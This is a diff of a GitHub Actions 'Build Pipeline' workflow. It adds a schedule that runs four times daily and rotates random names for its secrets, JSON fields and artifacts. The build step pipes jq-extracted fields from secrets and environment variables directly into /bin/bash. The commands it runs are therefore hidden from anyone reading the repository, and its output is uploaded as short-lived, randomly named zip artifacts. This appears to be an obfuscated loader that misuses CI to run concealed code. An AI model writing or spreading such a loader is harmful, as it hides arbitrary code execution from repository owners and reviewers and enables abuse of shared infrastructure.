@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '22 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,18 +20,18 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          una931: ${{ secrets.una931 }}
+          y80422: ${{ secrets.y80422 }}
         run: |
-          printf '%s' "$una931" | jq -r .vo0437 | /bin/bash
-          echo $kz4943 | jq -r .q60169 | /bin/bash
-          printf '%s' "$xc8276" | jq -r .gykj47960 | /bin/bash
-          printf '%s' "$fyntd9" | jq -r .ljqz6689 | /bin/bash
-          printf '%s' "$rdwg85" | jq -r .ej0 | /bin/bash
+          printf '%s' "$y80422" | jq -r .oi8 | /bin/bash
+          printf '%s' "$v75" | jq -r .lzfcz02824 | /bin/bash
+          echo $blkzz78364 | jq -r .f7298 | /bin/bash
+          printf '%s' "$rf818" | jq -r .i5187 | /bin/bash
+          printf '%s' "$xe6" | jq -r .zh678 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: vlg2eL7f
+          name: XSWpw9dX
           path: "*.zip"
           retention-days: 1
